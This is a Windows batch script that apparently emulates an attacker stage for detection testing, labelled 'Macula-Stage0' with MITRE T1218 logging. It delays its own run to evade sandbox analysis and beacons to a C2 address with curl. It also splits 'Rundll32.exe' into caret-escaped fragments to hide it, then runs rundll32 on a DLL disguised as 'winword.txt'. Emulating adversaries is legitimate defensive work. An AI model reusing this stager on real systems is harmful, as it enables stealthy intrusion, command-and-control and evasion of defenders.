@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET yktnwwf=%APPDATA%\8524\56f44cf6
SET fpakbq=Macula-Stage0-8524
SET qazwsx=https://10.0.0.49
SET edcrfv=https://10.0.0.49/stage/2/icon.png?8524-7
SET tgbyhn=BALAM-S2BO
SET ujmik=7
SET olpzaq=winword.txt
SET wsjuz=8524

REM Log file setup
SET ikmjhy=%APPDATA%\!ujmik!\macula-simulations.log
SET ttfquw=7

REM Initial delay - evade sandbox analysis
echo [%DATE% %TIME%][DEBUG][!tgbyhn!]: delay_start=30s>> "!ikmjhy!" 2>nul
timeout /t 30 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!tgbyhn!]: delay_complete=success>> "!ikmjhy!" 2>nul

REM C2 Heartbeat - DO NOT OBFUSCATE curl
echo [%DATE% %TIME%][DEBUG][!tgbyhn!]: heartbeat_start=!edcrfv!>> "!ikmjhy!" 2>nul
curl -k -s -o nul "!edcrfv!"
echo [%DATE% %TIME%][DEBUG][!tgbyhn!]: heartbeat_complete=!errorlevel!>> "!ikmjhy!" 2>nul

REM Delay between operations
echo [%DATE% %TIME%][DEBUG][!tgbyhn!]: delay_start=12s>> "!ikmjhy!" 2>nul
ping -n 12 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!tgbyhn!]: delay_complete=success>> "!ikmjhy!" 2>nul

REM Change to output directory
echo [%DATE% %TIME%][DEBUG][!tgbyhn!]: chdir_start=!yktnwwf!>> "!ikmjhy!" 2>nul
cd /d "!yktnwwf!" >nul 2>&1
echo [%DATE% %TIME%][DEBUG][!tgbyhn!]: chdir_result=!errorlevel!>> "!ikmjhy!" 2>nul

REM Random delay variable
SET /A pqlkjm=!RANDOM! %% 20 + 10
echo [%DATE% %TIME%][DEBUG][!tgbyhn!]: random_delay_start=!pqlkjm!s>> "!ikmjhy!" 2>nul
timeout /t !pqlkjm! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!tgbyhn!]: random_delay_complete=success>> "!ikmjhy!" 2>nul

REM Obfuscate Rundll32 with caret escapes and fragmentation
SET zxcrt1=R^u^n
SET zxcrt2=d^l^l^3^2^.
SET zxcrt3=e^x^e
SET ghnbvc=!zxcrt1!!zxcrt2!!zxcrt3!

REM Execute Rundll32 with DLL - T1218: Signed Binary Proxy Execution
echo [%DATE% %TIME%][DEBUG][!tgbyhn!]: process_start=rundll32_exec>> "!ikmjhy!" 2>nul
%SystemRoot%\system32\!ghnbvc% !olpzaq!, DllMain

REM Log TTP result
SET ttp_result=0
SET err_detail=

IF !errorlevel! EQU 0 (
    SET ttp_result=1
    SET err_detail=
) ELSE (
    SET err_detail=rundll32_error_!errorlevel!
)

REM Format timestamp for TTP log
SET vfrtyh=!DATE:/=-!
SET vfrtyh=!vfrtyh:~-10!
SET bgtnhy=!TIME:,=.!
IF "!bgtnhy:~0,1!"==" " SET bgtnhy=0!bgtnhy:~1!
SET ttp_ts=!vfrtyh! !bgtnhy:~0,12!

REM Append TTP log entry
echo [!ttp_ts!][!tgbyhn!]: !ttfquw!-!wsjuz!-T1218|Signed_Binary_Proxy_Execution=!ttp_result!:!err_detail!>> "!ikmjhy!" 2>nul
echo [%DATE% %TIME%][DEBUG][!tgbyhn!]: ttp_logged=T1218>> "!ikmjhy!" 2>nul

REM Final delay
echo [%DATE% %TIME%][DEBUG][!tgbyhn!]: delay_start=8s>> "!ikmjhy!" 2>nul
CHOICE /C Y /N /D Y /T 8 >nul
echo [%DATE% %TIME%][DEBUG][!tgbyhn!]: delay_complete=success>> "!ikmjhy!" 2>nul

ENDLOCAL